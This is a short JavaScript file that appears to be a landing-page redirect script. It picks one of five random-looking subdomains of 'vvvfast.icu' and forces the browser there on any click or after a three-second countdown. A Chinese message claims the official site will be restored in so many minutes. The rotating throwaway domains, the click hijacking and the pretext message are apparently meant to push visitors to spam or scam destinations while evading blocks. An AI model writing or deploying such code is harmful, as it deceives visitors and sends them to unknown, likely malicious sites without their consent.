var domain = ["pug3p75bepxx", "fupnejkzd8zb", "duxxuluky38u","aqvf6xrenxec","2awcvaerjwkd"];
var topLevelDomain = "vvvfast.icu";
var randomIndex = Math.floor(Math.random() * domain.length);
var selectedDomain = domain[randomIndex];
var targetURL = "https://" + selectedDomain + "." + topLevelDomain;

document.addEventListener("click", function() {
  window.location.replace(targetURL);
});

window.onload = function() {
  var count = 3;
  var textElement = document.getElementById('countdown');
  var countdown = setInterval(function() {
      textElement.textContent = count;
      count--;
      if (count < 0) {
          clearInterval(countdown);
          window.location.replace(targetURL);
      }
  }, 1000);
};

function Countdown(targetDate, elementId) {
  this.targetDate = targetDate;
  this.elementId = elementId;
}

Countdown.prototype.getTotalMinutes = function() {
  var now = new Date();
  var diff = Math.floor((this.targetDate - now) / 1000);
  var minutes = Math.floor(diff / 60);
  return minutes > 0 ? minutes : 0;
};

Countdown.prototype.updateDisplay = function() {
  var minutes = this.getTotalMinutes();

  var countdownElement = document.getElementById(this.elementId);
  countdownElement.innerHTML = "距离官网恢复" + minutes + "分钟";
};

Countdown.prototype.start = function() {
  this.updateDisplay();
  var self = this;
  setInterval(function() {
    self.updateDisplay();
  }, 1000);
};